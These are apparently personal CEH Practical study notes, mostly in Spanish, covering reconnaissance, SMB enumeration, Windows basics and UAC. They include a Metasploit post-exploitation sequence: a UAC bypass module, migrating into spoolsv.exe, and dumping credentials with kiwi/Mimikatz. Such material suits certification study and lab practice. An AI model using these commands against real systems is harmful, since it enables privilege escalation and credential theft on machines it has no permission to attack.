# CEH-Practical

## Reconnasiance/Footprinting

### netdiscover (ARP)

![image](https://user-images.githubusercontent.com/63270579/230136974-19ace88f-f73c-428c-bdf6-1bc2b4419637.png)

### Metasploit SMB

Para iniciar metasploit 

```
msfdb init && msfconsole
# En el caso de que no inicie pues ese pero siempre ejecuto nada mas este:
msfconsole
```
Buscar palabras claves 

```
search smb
```
Pero podemos llevar la busqueda a mas con un filtro como este que hice

![image](https://user-images.githubusercontent.com/63270579/230143806-39c278dc-e79c-4754-8a7f-67e9577b81a1.png)

Para encontrar que exploits se pueden usar para ***PRIV ESC***

```
run post/multi/recon/local_exploit_suggester
CTRL+z
set session 1 # Ve las opciones para que veas que pide que pongas una session
use exploit/windows/local/bypassuac_eventvwr
show options
set lhost
run
```

![image](https://user-images.githubusercontent.com/63270579/230158169-e12c02fd-68db-4d7b-a1ce-b77ae089575a.png)

Para ver los privilegios

```
getprivs
```

Para migrar a procesos que puedan manipilar el lsass

```
migrate -N spoolsv.exe

```
Para dumpear los passwords con  Mimikatz (Kiwi is the updated version of Mimikatz)
 ```
 load kiwi
 help
 cred_all
 ```
 
### Encontrar scripts nmap SMB

Vamos a buscarlos recordamos que los scripts tienen la extencion .nse

```
#Primero vemos si la base que usa locate esta actualizada

updatedb
locate *.nse
#Filtramos lo que nos interesa 
locate *.nse | grep "smb"

```


![image](https://user-images.githubusercontent.com/63270579/230146227-e6c3af45-1cea-46ee-9b30-0687eca73855.png)


## Windows  

### File system NTFS

The file system used in modern versions of Windows is the New Technology File System or simply NTFS. Before NTFS, there was FAT16/FAT32 (File Allocation Table) and HPFS (High Performance File System). 

You still see FAT partitions in use today. For example, you typically see FAT partitions in USB devices, MicroSD cards, etc. but traditionally not on personal Windows computers/laptops or Windows servers.

NTFS addresses many of the limitations of the previous file systems; such as: 

    Supports files larger than 4GB
    
    Set specific permissions on folders and files
    
    Folder and file compression
    
    Encryption (Encryption File System or EFS)
    
### Another feature of NTFS is Alternate Data Streams (ADS).

Every file has at least one data stream ($DATA), and ADS allows files to contain more than one stream of data. Natively Window Explorer doesn't display ADS to the user. There are 3rd party executables that can be used to view this data, but Powershell gives you the ability to view ADS for files.

From a security perspective, malware writers have used ADS to hide data. 1


### lsass

The lsass service, the service responsible for authentication within Windows.

### spoolsv.exe

The printer spool service happens to meet our needs perfectly for this and it'll restart if we crash it! What's the name of the printer service?


### La herramienta lusrmgr.msc para ver usuarios y grupos

Sirve para ver usuarios y grupos y se ejecuta con windows ejecutar...

![image](https://user-images.githubusercontent.com/63270579/230254629-0d0d7d4f-cc8b-4277-85e1-87455723147f.png)

Pero existen otras herramientas que permiten lo mismo desde la consola.

### net user

Para ver la informacion de un usuario (osea se tiene que tener el nombre del usuario):

```
net user tryhackmebilly
```

![image](https://user-images.githubusercontent.com/63270579/230254835-7253e274-2c0d-4369-a80d-06992b49fa29.png)

Para solo ver los usuarios de ese equipo:

```
net user

```

Para ver a que grupos pertenece el usuario con el que estas logueado:

```
whoami /groups

```

##  User Account Control (UAC)

Es una proteccion para evitar ejecutar con privilegios todo el tiempo todo

> La gran mayoría de los usuarios domésticos inician sesión en sus sistemas Windows como administradores locales. Recuerde de la tarea anterior que cualquier usuario con administrador como tipo de cuenta puede realizar cambios en el sistema.

Un usuario no necesita ejecutar con privilegios altos (elevados) en el sistema para ejecutar tareas que no requieren dichos privilegios, como navegar por Internet, trabajar en un documento de Word, etc. Este privilegio elevado aumenta el riesgo de que el sistema compromiso porque facilita que el malware infecte el sistema. En consecuencia, dado que la cuenta de usuario puede realizar cambios en el sistema, el malware se ejecutaría en el contexto del usuario que inició sesión.

Para proteger al usuario local con dichos privilegios, Microsoft introdujo el Control de cuentas de usuario (UAC). Este concepto se introdujo por primera vez con Windows Vista de corta duración y continuó con las versiones de Windows que siguieron.

Nota: UAC (de forma predeterminada) no se aplica a la cuenta de administrador local integrada.

 Ctrl+Shift+Esc es un shortcut para el taskmng en windows.
 
 ## There's difference between encoding and encrypting.
 
 Let's say you have an encrypted file, the only way to decrypt it is using key. While encoded data can be decoded immediately, without keys. It's NOT a form of encryption, it just a way of representing data.




































































